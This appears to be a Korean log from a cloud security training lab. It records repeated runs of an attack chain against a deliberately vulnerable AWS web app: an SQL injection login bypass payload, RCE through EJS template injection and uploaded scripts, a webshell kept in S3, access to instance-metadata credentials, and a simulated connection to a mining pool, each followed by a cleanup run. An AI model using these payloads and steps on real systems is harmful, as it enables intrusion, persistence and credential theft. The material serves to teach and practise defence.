@@ -1,0 +1,242 @@
+[01:14:53] INFO  ================================================================
+[01:14:53] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[01:14:53] INFO    흐름도2 (WHS 실습)
+[01:14:53] INFO  ================================================================
+[01:14:53] INFO  ================================================================
+[01:14:53] INFO    STEP 1 — SQLi 인증 우회(T1190)
+[01:14:53] INFO  ================================================================
+[01:14:53] INFO  [auth] SQLi 인증 우회 시도 — payload="' OR '1'='1' -- "
+[01:14:54] INFO  [auth] SQLi 우회 성공 — 탈취 세션 user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
+[01:14:54] INFO    [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨
+[01:14:54] INFO  [pin] 대상 인스턴스 고정 — ip-10-3-11-239.ap-northeast-2.compute.internal
+[01:14:54] INFO        이후 모든 단계는 이 1대에서만 실행된다(다른 인스턴스 미접촉).
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    [SSTI] 실행 컨텍스트 확인 (대상 ip-10-3-11-239.ap-northeast-2.compute.internal 고정)
+[01:14:54] INFO      ssti id         → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0
+[01:14:54] INFO      ssti hostname   → ip-10-3-11-239.ap-northeast-2.compute.internal
+[01:14:54] INFO      ssti uname -sr  → Linux 6.18.48-109.150.amzn2023.x86_64
+[01:14:54] INFO    [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)
+[01:14:54] INFO  [payload] probe.sh (585 bytes) 업로드
+[01:14:54] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/3914702b-c36b-4a06-bf5f-6560c8bb28a5--probe.sh (executable=True)
+[01:14:54] INFO      probe.sh 실행 결과 → /tmp/whs-file-run-hy9lmd/upload.sh: line 8: $'\r': command not found | /tmp/whs-file-run-hy9lmd/upload.sh: line 10: syntax error near unexpected token `$'in\r'' | /tmp/whs-file-run-hy9lmd/upload.sh: line 10: `case $(hostname) in'
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    STEP 3 — 웹셸 지속성(T1505.003)
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO  [payload] persist.sh (876 bytes) 업로드
+[01:14:54] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/085bd89f-3e4e-47fe-949f-b25e54190c8a--persist.sh (executable=True)
+[01:14:54] INFO    [+] 웹셸 S3 상주 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/085bd89f-3e4e-47fe-949f-b25e54190c8a--persist.sh
+[01:14:54] INFO        → execute(key) 로 재호출 = stateless 웹셸 (대상 ip-10-3-11-239.ap-northeast-2.compute.internal 한정)
+[01:14:54] INFO    [+] ip-10-3-11-239.ap-northeast-2.compute.internal 에서 재호출 성공: /tmp/whs-file-run-d0sJJ5/upload.sh: line 11: $'\r': command not found | /tmp/whs-file-run-d0sJJ5/upload.sh: line 13: syntax error near unexpected token `$'in\r'' | /tmp/whs-file-run-d0sJJ5/upload.sh: line 13: `case $(hostname) in'
+[01:14:54] INFO    [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보
+[01:14:54] INFO        정리용 key 기록: recovery/webshell_keys.json
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    [+] 웹셸 셸에서 IMDS 도달 — role=cloud9-infra-attack-ec2-role
+[01:14:54] INFO        → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내
+[01:14:54] INFO  ================================================================
+[01:14:54] INFO    주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.
+[01:14:54] INFO    [+] 마이닝풀 DNS 해석: pool.supportxmr.com → 141.94.96.195   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.144   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.71    pool-fr.supportxmr.com pool.supportxmr.com
+[01:14:55] INFO    [+] 마이닝풀 TCP connect(pool.supportxmr.com:3333): TCP_OPEN
+[01:14:55] INFO    [+] 3초 CPU 스핀(채굴 흉내, 상한 5초)
+[01:14:57] INFO        스핀 결과: spin_iters=2405
+[01:14:57] INFO  ================================================================
+[01:14:57] INFO    SCENARIO 2 종료
+[01:14:57] INFO    로그: scenario2/scenario2.log
+[01:14:57] INFO  ================================================================
+[01:17:21] INFO  ================================================================
+[01:17:21] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[01:17:21] INFO    흐름도2 (WHS 실습)
+[01:17:21] INFO  ================================================================
+[01:17:21] INFO  ================================================================
+[01:17:21] INFO    STEP 1 — SQLi 인증 우회(T1190)
+[01:17:21] INFO  ================================================================
+[01:17:21] INFO  [auth] SQLi 인증 우회 시도 — payload="' OR '1'='1' -- "
+[01:17:22] INFO  [auth] SQLi 우회 성공 — 탈취 세션 user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
+[01:17:22] INFO    [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨
+[01:17:22] INFO  [pin] 대상 인스턴스 고정 — ip-10-3-11-239.ap-northeast-2.compute.internal
+[01:17:22] INFO        이후 모든 단계는 이 1대에서만 실행된다(다른 인스턴스 미접촉).
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    [SSTI] 실행 컨텍스트 확인 (대상 ip-10-3-11-239.ap-northeast-2.compute.internal 고정)
+[01:17:22] INFO      ssti id         → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0
+[01:17:22] INFO      ssti hostname   → ip-10-3-11-239.ap-northeast-2.compute.internal
+[01:17:22] INFO      ssti uname -sr  → Linux 6.18.48-109.150.amzn2023.x86_64
+[01:17:22] INFO    [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)
+[01:17:22] INFO  [payload] probe.sh (568 bytes) 업로드
+[01:17:22] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/a7b22e5d-9950-44d3-9d69-79f4599ff053--probe.sh (executable=True)
+[01:17:22] INFO      probe.sh 실행 결과 → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | Linux 6.18.48-109.150.amzn2023.x86_64 | /tmp/whs-file-run-rhegY1
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    STEP 3 — 웹셸 지속성(T1505.003)
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO  [payload] persist.sh (855 bytes) 업로드
+[01:17:22] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/ff49a00c-b424-4bed-9b26-13579c34c6a2--persist.sh (executable=True)
+[01:17:22] INFO    [+] 웹셸 S3 상주 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/ff49a00c-b424-4bed-9b26-13579c34c6a2--persist.sh
+[01:17:22] INFO        → execute(key) 로 재호출 = stateless 웹셸 (대상 ip-10-3-11-239.ap-northeast-2.compute.internal 한정)
+[01:17:22] INFO    [+] ip-10-3-11-239.ap-northeast-2.compute.internal 에서 재호출 성공: marker=whs-scenario2-webshell | runid=edc0aa744d1c | uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | 2026-09-29T16:17:18Z
+[01:17:22] INFO    [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보
+[01:17:22] INFO        정리용 key 기록: recovery/webshell_keys.json
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    [+] 웹셸 셸에서 IMDS 도달 — role=cloud9-infra-attack-ec2-role
+[01:17:22] INFO        → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내
+[01:17:22] INFO  ================================================================
+[01:17:22] INFO    주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.
+[01:17:22] INFO    [+] 마이닝풀 DNS 해석: pool.supportxmr.com → 141.94.96.144   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.195   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.71    pool-fr.supportxmr.com pool.supportxmr.com
+[01:17:22] INFO    [+] 마이닝풀 TCP connect(pool.supportxmr.com:3333): TCP_OPEN
+[01:17:22] INFO    [+] 3초 CPU 스핀(채굴 흉내, 상한 5초)
+[01:17:25] INFO        스핀 결과: spin_iters=2520
+[01:17:25] INFO  ================================================================
+[01:17:25] INFO    SCENARIO 2 종료
+[01:17:25] INFO    로그: scenario2/scenario2.log
+[01:17:25] INFO  ================================================================
+[10:23:23] INFO  ================================================================
+[10:23:23] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[10:23:23] INFO    흐름도2 (WHS 실습)
+[10:23:23] INFO  ================================================================
+[10:23:23] INFO  ================================================================
+[10:23:23] INFO    STEP 1 — SQLi 인증 우회(T1190)
+[10:23:23] INFO  ================================================================
+[10:23:23] INFO  [auth] SQLi 인증 우회 시도 — payload="' OR '1'='1' -- "
+[10:23:24] INFO  [auth] SQLi 우회 성공 — 탈취 세션 user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
+[10:23:24] INFO    [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨
+[10:23:24] INFO  [pin] 대상 인스턴스 고정 — ip-10-3-11-45.ap-northeast-2.compute.internal
+[10:23:24] INFO        이후 모든 단계는 이 1대에서만 실행된다(다른 인스턴스 미접촉).
+[10:23:24] INFO  ================================================================
+[10:23:24] INFO    STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)
+[10:23:24] INFO  ================================================================
+[10:23:24] INFO    [SSTI] 실행 컨텍스트 확인 (대상 ip-10-3-11-45.ap-northeast-2.compute.internal 고정)
+[10:23:24] INFO      ssti id         → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0
+[10:23:24] INFO      ssti hostname   → ip-10-3-11-45.ap-northeast-2.compute.internal
+[10:23:25] INFO      ssti uname -sr  → Linux 6.18.48-109.150.amzn2023.x86_64
+[10:23:25] INFO    [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)
+[10:23:25] INFO  [payload] probe.sh (567 bytes) 업로드
+[10:23:25] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/583bffaf-f950-44bc-ac86-a929ad3788c9--probe.sh (executable=True)
+[10:23:25] INFO      probe.sh 실행 결과 → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | Linux 6.18.48-109.150.amzn2023.x86_64 | /tmp/whs-file-run-IkcdKy
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO    STEP 3 — 웹셸 지속성(T1505.003)
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO  [payload] persist.sh (854 bytes) 업로드
+[10:23:25] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/bd4abe93-5d64-4f9b-88ee-6e04063ca7b0--persist.sh (executable=True)
+[10:23:25] INFO    [+] 웹셸 S3 상주 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/bd4abe93-5d64-4f9b-88ee-6e04063ca7b0--persist.sh
+[10:23:25] INFO        → execute(key) 로 재호출 = stateless 웹셸 (대상 ip-10-3-11-45.ap-northeast-2.compute.internal 한정)
+[10:23:25] INFO    [+] ip-10-3-11-45.ap-northeast-2.compute.internal 에서 재호출 성공: marker=whs-scenario2-webshell | runid=b93fabb61a05 | uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | 2026-09-30T01:23:25Z
+[10:23:25] INFO    [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보
+[10:23:25] INFO        정리용 key 기록: recovery/webshell_keys.json
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO    STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO    [+] 웹셸 셸에서 IMDS 도달 — role=cloud9-infra-attack-ec2-role
+[10:23:25] INFO        → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO    STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내
+[10:23:25] INFO  ================================================================
+[10:23:25] INFO    주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.
+[10:23:26] INFO    [+] 마이닝풀 DNS 해석: pool.supportxmr.com → 141.94.96.144   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.71    pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.195   pool-fr.supportxmr.com pool.supportxmr.com
+[10:23:26] INFO    [+] 마이닝풀 TCP connect(pool.supportxmr.com:3333): TCP_OPEN
+[10:23:26] INFO    [+] 3초 CPU 스핀(채굴 흉내, 상한 5초)
+[10:23:29] INFO        스핀 결과: spin_iters=2756
+[10:23:29] INFO  ================================================================
+[10:23:29] INFO    SCENARIO 2 종료
+[10:23:29] INFO    로그: scenario2/scenario2.log
+[10:23:29] INFO  ================================================================
+[10:23:41] INFO  ================================================================
+[10:23:41] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[10:23:41] INFO    흐름도2 (WHS 실습)
+[10:23:41] INFO  ================================================================
+[10:23:41] INFO  ================================================================
+[10:23:41] INFO    RESTORE — S3 업로드 객체 삭제
+[10:23:41] INFO  ================================================================
+[10:23:41] INFO    [+] 복구 전용 자격증명 사용 (RESTORE_AWS_* — 공격 경로 아님)
+[10:23:41] INFO    [+] 대상 6개 (버킷 whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an)
+[10:23:42] INFO    [+] 삭제: persist.sh
+[10:23:42] INFO    [+] 삭제: probe.sh
+[10:23:42] INFO    [+] 삭제: probe.sh
+[10:23:42] INFO    [+] 삭제: persist.sh
+[10:23:42] INFO    [+] 삭제: probe.sh
+[10:23:42] INFO    [+] 삭제: persist.sh
+[10:23:42] INFO    [=] 삭제 6/6
+[10:23:42] INFO        기록 초기화: recovery/uploaded_objects.json
+[10:23:42] INFO  ================================================================
+[10:23:42] INFO    SCENARIO 2 복구 종료
+[10:23:42] INFO    로그: scenario2/scenario2.log
+[10:23:42] INFO  ================================================================
+[10:30:11] INFO  ================================================================
+[10:30:11] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[10:30:11] INFO    흐름도2 (WHS 실습)
+[10:30:11] INFO  ================================================================
+[10:30:11] INFO  ================================================================
+[10:30:11] INFO    STEP 1 — SQLi 인증 우회(T1190)
+[10:30:11] INFO  ================================================================
+[10:30:11] INFO  [auth] SQLi 인증 우회 시도 — payload="' OR '1'='1' -- "
+[10:30:11] INFO  [auth] SQLi 우회 성공 — 탈취 세션 user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
+[10:30:11] INFO    [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨
+[10:30:12] INFO  [pin] 대상 인스턴스 고정 — ip-10-3-11-45.ap-northeast-2.compute.internal
+[10:30:12] INFO        이후 모든 단계는 이 1대에서만 실행된다(다른 인스턴스 미접촉).
+[10:30:12] INFO  ================================================================
+[10:30:12] INFO    STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)
+[10:30:12] INFO  ================================================================
+[10:30:12] INFO    [SSTI] 실행 컨텍스트 확인 (대상 ip-10-3-11-45.ap-northeast-2.compute.internal 고정)
+[10:30:12] INFO      ssti id         → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0
+[10:30:12] INFO      ssti hostname   → ip-10-3-11-45.ap-northeast-2.compute.internal
+[10:30:13] INFO      ssti uname -sr  → Linux 6.18.48-109.150.amzn2023.x86_64
+[10:30:13] INFO    [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)
+[10:30:13] INFO  [payload] probe.sh (567 bytes) 업로드
+[10:30:13] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/875fc4aa-1e0b-45bb-aac7-c36906953819--probe.sh (executable=True)
+[10:30:13] INFO      probe.sh 실행 결과 → uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | Linux 6.18.48-109.150.amzn2023.x86_64 | /tmp/whs-file-run-5MvAcq
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO    STEP 3 — 웹셸 지속성(T1505.003)
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO  [payload] persist.sh (854 bytes) 업로드
+[10:30:13] INFO  [upload] S3 저장됨 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/04ad7fba-3b5d-42a3-8bff-128fcaf12588--persist.sh (executable=True)
+[10:30:13] INFO    [+] 웹셸 S3 상주 key=whs-uploads/13d0d481-afb9-4c4a-a986-c2c69ce19bf4/04ad7fba-3b5d-42a3-8bff-128fcaf12588--persist.sh
+[10:30:13] INFO        → execute(key) 로 재호출 = stateless 웹셸 (대상 ip-10-3-11-45.ap-northeast-2.compute.internal 한정)
+[10:30:13] INFO    [+] ip-10-3-11-45.ap-northeast-2.compute.internal 에서 재호출 성공: marker=whs-scenario2-webshell | runid=0952a89eb8ea | uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=system_u:system_r:unconfined_service_t:s0 | 2026-09-30T01:30:13Z
+[10:30:13] INFO    [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보
+[10:30:13] INFO        정리용 key 기록: recovery/webshell_keys.json
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO    STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO    [+] 웹셸 셸에서 IMDS 도달 — role=cloud9-infra-attack-ec2-role
+[10:30:13] INFO        → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO    STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내
+[10:30:13] INFO  ================================================================
+[10:30:13] INFO    주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.
+[10:30:14] INFO    [+] 마이닝풀 DNS 해석: pool.supportxmr.com → 141.94.96.71    pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.144   pool-fr.supportxmr.com pool.supportxmr.com 141.94.96.195   pool-fr.supportxmr.com pool.supportxmr.com
+[10:30:14] INFO    [+] 마이닝풀 TCP connect(pool.supportxmr.com:3333): TCP_OPEN
+[10:30:14] INFO    [+] 3초 CPU 스핀(채굴 흉내, 상한 5초)
+[10:30:17] INFO        스핀 결과: spin_iters=2877
+[10:30:17] INFO  ================================================================
+[10:30:17] INFO    SCENARIO 2 종료
+[10:30:17] INFO    로그: scenario2/scenario2.log
+[10:30:17] INFO  ================================================================
+[10:30:17] WARNING 
+[10:30:17] WARNING [원상복구]  python scenario2.py --restore
+[10:30:17] WARNING   S3 에 올린 업로드 객체를 지운다. 지우기 전까지는 key 만 알면
+[10:30:17] WARNING   계속 재실행되는 웹셸로 남는다 (호스트에는 아무것도 안 남는다).
+[10:30:34] INFO  ================================================================
+[10:30:34] INFO    SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹
+[10:30:34] INFO    흐름도2 (WHS 실습)
+[10:30:34] INFO  ================================================================
+[10:30:34] INFO  ================================================================
+[10:30:34] INFO    RESTORE — S3 업로드 객체 삭제
+[10:30:34] INFO  ================================================================
+[10:30:34] INFO    [+] 복구 전용 자격증명 사용 (RESTORE_AWS_* — 공격 경로 아님)
+[10:30:34] INFO    [+] 대상 2개 (버킷 whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an)
+[10:30:35] INFO    [+] 삭제: probe.sh
+[10:30:35] INFO    [+] 삭제: persist.sh
+[10:30:35] INFO    [=] 삭제 2/2
+[10:30:35] INFO        기록 초기화: recovery/uploaded_objects.json
+[10:30:35] INFO  ================================================================
+[10:30:35] INFO    SCENARIO 2 복구 종료
+[10:30:35] INFO    로그: scenario2/scenario2.log
+[10:30:35] INFO  ================================================================
